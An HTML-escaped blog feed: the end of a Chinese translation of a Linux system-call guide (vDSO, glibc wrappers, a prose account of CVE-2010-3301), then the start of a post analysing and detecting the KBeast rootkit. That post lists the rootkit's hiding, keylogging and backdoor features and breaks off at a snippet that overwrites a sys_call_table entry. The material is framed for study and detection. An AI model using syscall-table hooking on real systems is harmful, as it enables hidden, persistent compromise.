&lt;p&gt;没有软件中断，也不需要复杂的&lt;code&gt;sysenter&lt;/code&gt;或者&lt;code&gt;syscall&lt;/code&gt;的记录工作。&lt;code&gt;gettimeofday&lt;/code&gt;只是一个普通的函数调用。&lt;/p&gt;
&lt;p&gt;当你执行&lt;code&gt;ldd&lt;/code&gt;命令时，可以看到vDSO出现在第一个条目中：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ ldd `which bash`
 linux-vdso.so.1 =&amp;gt;  (0x00007fff667ff000)
 libtinfo.so.5 =&amp;gt; /lib/x86_64-linux-gnu/libtinfo.so.5 (0x00007f623df7d000)
  libdl.so.2 =&amp;gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f623dd79000)
  libc.so.6 =&amp;gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f623d9ba000)
  /lib64/ld-linux-x86-64.so.2 (0x00007f623e1ae000)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;下面来看看vDSO在内核中是如何设置的。&lt;/p&gt;
&lt;h3 id=&quot;内核中的vDSO&quot;&gt;&lt;a href=&quot;#内核中的vDSO&quot; class=&quot;headerlink&quot; title=&quot;内核中的vDSO&quot;&gt;&lt;/a&gt;内核中的vDSO&lt;/h3&gt;&lt;p&gt;可以在 &lt;a href=&quot;https://github.com/torvalds/linux/tree/v3.13/arch/x86/vdso&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/vdso/&lt;/code&gt;&lt;/a&gt;中找到vDSO的源码。 其中包括一小段汇编代码、一些C源文件和一个链接器脚本&lt;/p&gt;
&lt;p&gt;此&lt;a href=&quot;https://sourceware.org/binutils/docs/ld/Scripts.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;链接器脚本&lt;/a&gt;是个很酷的东西，可以具体去了解一下。&lt;/p&gt;
&lt;p&gt;看看&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/vdso/vdso.lds.S&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/vdso/vdso.lds.S&lt;/code&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; * This controls what userland symbols we export from the vDSO.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;VERSION &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        LINUX_2&lt;span class=&quot;number&quot;&gt;.6&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        global:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                clock_gettime;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                __vdso_clock_gettime;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                gettimeofday;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                __vdso_gettimeofday;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                getcpu;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                __vdso_getcpu;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                time;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                __vdso_time;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        local: *;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;链接器脚本很有用处，但并不被大家所熟知。链接器脚本会处理vDSO要导出的符号表。&lt;/p&gt;
&lt;p&gt;可以看到，vDSO导出了4个不同的函数，每个函数都有两个名字。&lt;br&gt;可以在此文件夹下的C文件中找到函数的定义。&lt;/p&gt;
&lt;p&gt;例如，&lt;code&gt;gettimeofday&lt;/code&gt;的源代码可以在&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/vdso/vclock_gettime.c#L281-L282&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/vdso/vclock_gettime.c&lt;/code&gt;&lt;/a&gt;中找到:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;int gettimeofday(struct timeval *, struct timezone *)
    __attribute__((weak, alias(&amp;quot;__vdso_gettimeofday&amp;quot;)));
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这段代码将&lt;code&gt;gettimeofday&lt;/code&gt;作为&lt;code&gt;__vdso_gettimeofday&lt;/code&gt; 的弱别名(&lt;a href=&quot;https://gcc.gnu.org/onlinedocs/gcc-4.3.5/gcc/Function-Attributes.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;weak alias&lt;/a&gt;)。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/vdso/vclock_gettime.c#L260-L280&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;同文件&lt;/a&gt;中的&lt;code&gt;__vdso_gettimeofday&lt;/code&gt;函数中包含了当用户程序执行&lt;code&gt;gettimeofday&lt;/code&gt;系统调用时真正在用户层执行的源代码。&lt;/p&gt;
&lt;h3 id=&quot;在内存中定为vDSO&quot;&gt;&lt;a href=&quot;#在内存中定为vDSO&quot; class=&quot;headerlink&quot; title=&quot;在内存中定为vDSO&quot;&gt;&lt;/a&gt;在内存中定为vDSO&lt;/h3&gt;&lt;p&gt;由于地址空间布局随机化(&lt;a href=&quot;https://en.wikipedia.org/wiki/Address_space_layout_randomization&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;ASLR&lt;/a&gt;)的原因,当程序开始执行时，vDSO会被加载到随机的地址空间中。&lt;/p&gt;
&lt;p&gt;如果vDSO加载到随机地址空间中，用户程序是如何找到它的呢？&lt;/p&gt;
&lt;p&gt;回想前文提到的&lt;code&gt;sysenter&lt;/code&gt;系统调用方法，用户程序要调用&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;函数，而不是自己写&lt;code&gt;sysenter&lt;/code&gt;汇编代码。&lt;/p&gt;
&lt;p&gt;而&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;函数也是vDSO的一部分。&lt;/p&gt;
&lt;p&gt;提供的代码样例中通过搜索&lt;a href=&quot;https://www.gnu.org/software/libc/manual/html_node/Auxiliary-Vector.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;ELF辅助头文件&lt;/a&gt;找到和&lt;code&gt;AT_SYSINFO&lt;/code&gt;匹配的头文件，头文件中含有&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;函数的地址。&lt;/p&gt;
&lt;p&gt;类似的，要定位到vDSO, 用户程序可以搜索ELF辅助头文件找到和&lt;code&gt;AT_SYSINFO_EHDR&lt;/code&gt;匹配的头文件. 里面包含由链接器脚本生成的vDSO的ELF头的起始地址。&lt;/p&gt;
&lt;p&gt;两个例子中，程序被加载时内核都会将其地址写入到ELF头中。这也就是为何正确的地址总是出现&lt;code&gt;AT_SYSINFO_EHDR&lt;/code&gt;和&lt;code&gt;AT_SYSINFO&lt;/code&gt;中。&lt;/p&gt;
&lt;p&gt;一旦定为到ELF头部信息，用户程序就能解析ELF对象了(可以用&lt;a href=&quot;http://www.mr511.de/software/english.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;libelf&lt;/a&gt;),并且可以根据需要调用ELF对象中的函数。&lt;/p&gt;
&lt;p&gt;这样很酷，因为这就意味着vDSO能充分利用ELF有用的特性，比如&lt;a href=&quot;https://www.akkadia.org/drepper/symbol-versioning&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt; symbol versioning&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;内核文档 &lt;a href=&quot;https://github.com/torvalds/linux/tree/v3.13/Documentation/vDSO&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;Documentation/vDSO/&lt;/code&gt;&lt;/a&gt;中有解析vDSO和调用其中函数的例子。&lt;/p&gt;
&lt;h3 id=&quot;glibc中的vDSO&quot;&gt;&lt;a href=&quot;#glibc中的vDSO&quot; class=&quot;headerlink&quot; title=&quot;glibc中的vDSO&quot;&gt;&lt;/a&gt;glibc中的vDSO&lt;/h3&gt;&lt;p&gt;大多数情况下，大家都会访问vDSO，但并不会意识到。那是因为glibc利用前面章节介绍的接口对其进行了封装抽象。&lt;/p&gt;
&lt;p&gt;当一个程序被加载时，&lt;a href=&quot;http://man7.org/linux/man-pages/man8/ld.so.8.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;动态链接器和加载器&lt;/a&gt;便会加载程序依赖的DSOs，也包括vDSO.&lt;/p&gt;
&lt;p&gt;当glibc解析被加载程序的ELF头部时，会存储有关于vDSO的一些位置信息。也包括简短的stub函数，用来在真正执行系统调用前搜索vDSO中的符号名。&lt;/p&gt;
&lt;p&gt;举个例子，&lt;code&gt;glibc&lt;/code&gt;中的&lt;code&gt;gettimeofday&lt;/code&gt;函数，定义在&lt;a href=&quot;https://github.molgen.mpg.de/git-mirror/glibc/blob/glibc-2.15/sysdeps/unix/sysv/linux/x86_64/gettimeofday.c#L26-L37&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;sysdeps/unix/sysv/linux/x86_64/gettimeofday.c&lt;/code&gt;&lt;/a&gt;中：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *&lt;span class=&quot;title&quot;&gt;gettimeofday_ifunc&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt; __&lt;span class=&quot;title&quot;&gt;asm__&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;string&quot;&gt;&quot;__gettimeofday&quot;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;gettimeofday_ifunc&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  PREPARE_VERSION (linux26, &lt;span class=&quot;string&quot;&gt;&quot;LINUX_2.6&quot;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;61765110&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;/* If the vDSO is not available we fall back on the old vsyscall.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  return (_dl_vdso_vsym (&lt;span class=&quot;string&quot;&gt;&quot;gettimeofday&quot;&lt;/span&gt;, &amp;amp;linux26)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          ?: (void *) VSYSCALL_ADDR_vgettimeofday);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;__asm (&lt;span class=&quot;string&quot;&gt;&quot;.type __gettimeofday, %gnu_indirect_function&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这段glibc中的代码会在vDSO中搜索&lt;code&gt;gettimeofday&lt;/code&gt;函数并且返回其地址。这些工作都通过 &lt;a href=&quot;http://willnewton.name/uncategorized/using-gnu-indirect-functions/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;间接函数&lt;/a&gt;封装好了。&lt;/p&gt;
&lt;p&gt;这就是程序如何通过glibc调用&lt;code&gt;gettimeofday&lt;/code&gt;并访问vDSO却完全不用切换到内核、引发特权级转变以及触发软件中断的全过程。&lt;/p&gt;
&lt;p&gt;其中也总结了Linux 32/64位 Intel/AMD系统的每种系统调用方法的优势。&lt;/p&gt;
&lt;h2 id=&quot;glibc-系统调用封装器&quot;&gt;&lt;a href=&quot;#glibc-系统调用封装器&quot; class=&quot;headerlink&quot; title=&quot;glibc 系统调用封装器&quot;&gt;&lt;/a&gt;glibc 系统调用封装器&lt;/h2&gt;&lt;p&gt;在讨论系统调用的时候，简单的提提glibc是如何处理系统调用是很有意义的。&lt;/p&gt;
&lt;p&gt;对于许多系统调用来说，glibc只需要一个简单的封装函数将参数传入合适的寄存器中，然后执行&lt;code&gt;syscall&lt;/code&gt;或者&lt;code&gt;int $0x80&lt;/code&gt;指令，或者调用&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;这些都是利用一系列在文本文件中定义的表完成的，这些表会经过脚本处理并输出C代码。&lt;/p&gt;
&lt;p&gt;例如，&lt;a href=&quot;https://github.molgen.mpg.de/git-mirror/glibc/blob/glibc-2.15/sysdeps/unix/syscalls.list&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;`sysdeps/unix/syscalls.list&lt;/a&gt; `文件描述了一些常用的系统调用:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;access - access i:si __access access acct - acct i:S acct chdir - chdir i:s __chdir chdir chmod - chmod i:si __chmod chmod
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;要了解每一栏目的含义，可以查看处理此文件的脚本注释： &lt;a href=&quot;https://github.molgen.mpg.de/git-mirror/glibc/blob/glibc-2.15/sysdeps/unix/make-syscalls.sh&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;sysdeps/unix/make-syscalls.sh&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;对于更复杂的系统调用，比如&lt;code&gt;exit&lt;/code&gt;，其会触发那些有真正C代码或汇编代码实现的处理函数，并不会出现在类似这样的文本文件中。&lt;/p&gt;
&lt;p&gt;以后的博文中会具体介绍glibc的实现以及linux内核中一些重要的系统调用。&lt;/p&gt;
&lt;h2 id=&quot;重要的syscall相关bugs&quot;&gt;&lt;a href=&quot;#重要的syscall相关bugs&quot; class=&quot;headerlink&quot; title=&quot;重要的syscall相关bugs&quot;&gt;&lt;/a&gt;重要的syscall相关bugs&lt;/h2&gt;&lt;p&gt;很荣幸能利用这次机会提两个与linux系统调用相关的神奇bugs.&lt;/p&gt;
&lt;p&gt;一起来瞧一瞧吧！&lt;/p&gt;
&lt;h3 id=&quot;CVE-2010-3301&quot;&gt;&lt;a href=&quot;#CVE-2010-3301&quot; class=&quot;headerlink&quot; title=&quot;CVE-2010-3301&quot;&gt;&lt;/a&gt;CVE-2010-3301&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=2010-3301&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这个安全利用&lt;/a&gt;能让本地用户获取root权限。&lt;/p&gt;
&lt;p&gt;引起这个漏洞的原因就在于汇编代码中的一个小bug，其允许用户程序触发x86_64系统中的传统系统调用。&lt;/p&gt;
&lt;p&gt;此利用代码相当聪明:在一个特定的地址下，利用&lt;code&gt;mmap&lt;/code&gt;生成一块内存区域，并利用一个整数让代码产生溢出：&lt;/p&gt;
&lt;p&gt;（还记得上面章节中提到的传统中断方式中的这段代码吗？）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;call *ia32_sys_call_table(,%rax,8)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;此代码可以将执行环境切换到一块任意的地址中，在那执行内核代码，从而可以将运行的进程权限提升到root.&lt;/p&gt;
&lt;h3 id=&quot;Android-sysenter-ABI-破坏&quot;&gt;&lt;a href=&quot;#Android-sysenter-ABI-破坏&quot; class=&quot;headerlink&quot; title=&quot;Android sysenter ABI 破坏&quot;&gt;&lt;/a&gt;Android &lt;code&gt;sysenter&lt;/code&gt; ABI 破坏&lt;/h3&gt;&lt;p&gt;还记得前面说过不要在应用程序代码中硬编码&lt;code&gt;sysenter&lt;/code&gt; ABI吗？&lt;/p&gt;
&lt;p&gt;不幸的是，用android-x86的一些人就容易犯这些错误。只要内核的ABI一改变，andorid-x86就瞬间无法工作。&lt;/p&gt;
&lt;p&gt;工作于内核的人最终用一些陈旧的&lt;code&gt;sysenter&lt;/code&gt;硬编码序列来恢复&lt;code&gt;sysenter&lt;/code&gt; ABI,以避免对Android设备的破坏。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://git.kernel.org/cgit/linux/kernel/git/tip/tip.git/commit/?id=30bfa7b3488bfb1bb75c9f50a5fcac1832970c60&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这里&lt;/a&gt;是提交给Linux 内核的patch. 你也可以在提交信息中找到向android源码提交的攻击代码的链接&lt;/p&gt;
&lt;p&gt;记住：千万不要自己编写汇编代码使用&lt;code&gt;sysenter&lt;/code&gt;. 如果你因为某种原因要自己实现，可以使用前面例子中的一些代码，起码要仔细检查一下 &lt;code&gt;__kernel_vsyscall&lt;/code&gt;函数。&lt;/p&gt;
&lt;h2 id=&quot;结论&quot;&gt;&lt;a href=&quot;#结论&quot; class=&quot;headerlink&quot; title=&quot;结论&quot;&gt;&lt;/a&gt;结论&lt;/h2&gt;&lt;p&gt;Linux内核中的系统调用机制是及其复杂的。触发系统调用有许多中方案，各都有其优缺点。&lt;/p&gt;
&lt;p&gt;自己编写汇编代码来触发系统调用可不是个好主意，因为在你代码下层的ABI可能会崩溃。系统中的内核以及libc的实现会（可能会）选择最快的方式来触发系统调用。&lt;/p&gt;
&lt;p&gt;如果你不能使用glibc提供的封装器(或者那个封装器不存在),你起码应该用&lt;code&gt;syscall&lt;/code&gt;封装器函数，或者仔细检查vDSO提供的&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;继续关注将来研究单个系统调用及其实现的相关文章。&lt;/p&gt;
&lt;h2 id=&quot;相关博文&quot;&gt;&lt;a href=&quot;#相关博文&quot; class=&quot;headerlink&quot; title=&quot;相关博文&quot;&gt;&lt;/a&gt;相关博文&lt;/h2&gt;&lt;p&gt;如果你喜欢这篇博客，你可能对以下底层技术的相关博客也感兴趣。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.packagecloud.io/eng/2016/02/29/how-does-strace-work/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;How does strace work?&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.packagecloud.io/eng/2016/03/14/how-does-ltrace-work/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;How does ltrace work?&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.packagecloud.io/eng/2016/03/21/apt-hash-sum-mismatch/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;APT Hash sum mismatch&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.packagecloud.io/eng/2014/10/28/howto-gpg-sign-verify-deb-packages-apt-repositories/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;HOWTO: GPG sign and verify deb packages and APT repositories&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.packagecloud.io/eng/2014/11/24/howto-gpg-sign-verify-rpm-packages-yum-repositories/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;HOWTO: GPG sign and verify RPM packages and yum repositories&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;Acknowledgement&quot;&gt;&lt;a href=&quot;#Acknowledgement&quot; class=&quot;headerlink&quot; title=&quot;Acknowledgement&quot;&gt;&lt;/a&gt;Acknowledgement&lt;/h2&gt;&lt;p&gt;本文遵守Attribution-NonCommercial-NoDerivatives 4.0 International License (CC BY-NC-ND 4.0)&lt;/p&gt;
&lt;p&gt;此文是一篇完整的译文，尽量在原文的基础上做到通俗易懂&lt;/p&gt;
&lt;p&gt;仅为学习使用，未经博主同意，请勿转载。&lt;/p&gt;
&lt;p&gt;原英文地址：&lt;a href=&quot;http://blog.packagecloud.io/eng/2016/04/05/the-definitive-guide-to-linux-system-calls/#bit-fast-system-calls。&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.packagecloud.io/eng/2016/04/05/the-definitive-guide-to-linux-system-calls/#bit-fast-system-calls。&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本文地址：&lt;a href=&quot;http://www.chongh.wiki/blog/2016/04/08/linux-syscalls/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.chongh.wiki/blog/2016/04/08/linux-syscalls/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;作者[新浪微博:&lt;a href=&quot;http://weibo.com/2767520802/profile?rightmod=1&amp;amp;wvr=6&amp;amp;mod=personinfo&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@diting0x&lt;/a&gt;]&lt;/p&gt;
&lt;p&gt;感谢好友 &lt;a href=&quot;http://weibo.com/u/2765244861?topnav=1&amp;amp;wvr=6&amp;amp;topsug=1&amp;amp;is_all=1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@睡眼惺忪的小叶先森&lt;/a&gt;与&lt;a href=&quot;http://weibo.com/u/2495479763?topnav=1&amp;amp;wvr=6&amp;amp;topsug=1&amp;amp;is_all=1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@skyline09&lt;/a&gt;指出的一些勘误及意见。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;长话短说（Too long;Don’t read)&lt;/li&gt;
&lt;li&gt;什么是系统调用&lt;/li&gt;
&lt;li&gt;准备知识&lt;ul&gt;
&lt;li&gt;硬件与软件&lt;/li&gt;
&lt;li&gt;用户程序，内核与CPU特权级&lt;/li&gt;
&lt;li&gt;中断&lt;/li&gt;
&lt;li&gt;特殊模块寄存器&lt;/li&gt;
&lt;li&gt;编写汇编代码触发系统调用不是个好主意
    
    </summary>
    
      <category term="operating-system" scheme="http://yoursite.com/categories/operating-system/"/>
    
    
      <category term="System" scheme="http://yoursite.com/tags/System/"/>
    
      <category term="Kernel" scheme="http://yoursite.com/tags/Kernel/"/>
    
      <category term="Syscall" scheme="http://yoursite.com/tags/Syscall/"/>
    
      <category term="OS" scheme="http://yoursite.com/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>kbeast Analysis and Detection</title>
    <link href="http://yoursite.com/blog/2016/04/02/kbeast-analysis-detection/"/>
    <id>http://yoursite.com/blog/2016/04/02/kbeast-analysis-detection/</id>
    <published>2016-04-02T21:24:15.000Z</published>
    <updated>2016-04-21T20:57:06.000Z</updated>
    
    <content type="html">&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;0X00 全文环境&lt;/li&gt;
&lt;li&gt;0X01 Kbeast 特性&lt;/li&gt;
&lt;li&gt;0X02 系统调用劫持基础&lt;/li&gt;
&lt;li&gt;0X03 Kbeast 使用&lt;/li&gt;
&lt;li&gt;0X04 Kbeast 核心&lt;/li&gt;
&lt;li&gt;0X05 Kbeast Detection &lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h3 id=&quot;0X00-全文环境&quot;&gt;&lt;a href=&quot;#0X00-全文环境&quot; class=&quot;headerlink&quot; title=&quot;0X00 全文环境&quot;&gt;&lt;/a&gt;0X00 全文环境&lt;/h3&gt;&lt;p&gt;Host Ubuntu 12.04 + Guest Ubuntu 10.04/11.04 + Libvmi + Volatility&lt;/p&gt;
&lt;p&gt;其中Kbeast运行在Guest Ubuntu 10.04/11.04中，libvmi与volatility运行在Host Ubuntu12.04中。&lt;/p&gt;
&lt;h3 id=&quot;0X01-Kbeast-特性&quot;&gt;&lt;a href=&quot;#0X01-Kbeast-特性&quot; class=&quot;headerlink&quot; title=&quot;0X01 Kbeast 特性&quot;&gt;&lt;/a&gt;0X01 Kbeast 特性&lt;/h3&gt;&lt;p&gt;以下是Kbeast实现的功能：&lt;/p&gt;
&lt;p&gt;- 隐藏可加载模块（LKM)&lt;/p&gt;
&lt;p&gt;- 隐藏文件/目录&lt;/p&gt;
&lt;p&gt;- 隐藏进程（ps,pstree,top,lsof)&lt;/p&gt;
&lt;p&gt;- 隐藏套接字和网络连接(netstat,lsof)&lt;/p&gt;
&lt;p&gt;- 记录键盘操作捕获用户行为&lt;/p&gt;
&lt;p&gt;- 反杀死进程&lt;/p&gt;
&lt;p&gt;- 反移除文件&lt;/p&gt;
&lt;p&gt;- 反删除可加载模块&lt;/p&gt;
&lt;p&gt;- root提权后门&lt;/p&gt;
&lt;p&gt;- 远程绑定后门 &lt;/p&gt;
&lt;h3 id=&quot;0X02-系统调用劫持基础&quot;&gt;&lt;a href=&quot;#0X02-系统调用劫持基础&quot; class=&quot;headerlink&quot; title=&quot;0X02 系统调用劫持基础&quot;&gt;&lt;/a&gt;0X02 系统调用劫持基础&lt;/h3&gt;&lt;p&gt;上述的Kbeast特性都是通过系统调用劫持实现的。在kernel 2.6.*之前，系统调用表”sys_call_table”是可以直接导出引用的，如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;extern void *sys_call_table[];
sys_call_table[__NR_syscall] = pointer
